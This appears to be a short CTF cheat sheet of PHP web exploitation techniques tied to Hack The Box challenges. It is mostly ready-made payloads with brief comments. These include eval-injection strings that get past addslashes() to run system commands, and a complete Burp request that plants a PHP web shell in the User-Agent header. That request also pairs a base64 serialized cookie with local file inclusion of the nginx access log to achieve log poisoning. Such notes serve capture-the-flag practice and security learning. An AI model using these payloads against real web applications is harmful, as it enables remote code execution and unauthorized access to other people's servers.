# addslashes()
This function escapes single & double quotes.
```php
# Assuming that the variable is passed to eval
${system($_GET[1])}&1=whoami;
# If it's not passed to eval
${eval($_GET[1])}&1=system($_GET[2]);&2=whoami;
```
- Challenge: https://app.hackthebox.com/challenges/lovetok
> **References:** 
> https://www.programmersought.com/article/30723400042/

# include() 
Only generates a warning, i.e., E_WARNING, and continue the execution of the script.

**Case**:  From LFI to log poisoning
- Burpsuite request example:
```txt
# Cookie Serialization exploit
# O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}

GET /?c=cat+/flag_qlvM8 HTTP/1.1
Host: 178.128.163.152:30522
User-Agent: Mozilla/5.0 <?php system($_GET['c']); ?> Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```
- Challenge: https://app.hackthebox.com/challenges/224

> **References:**
> https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
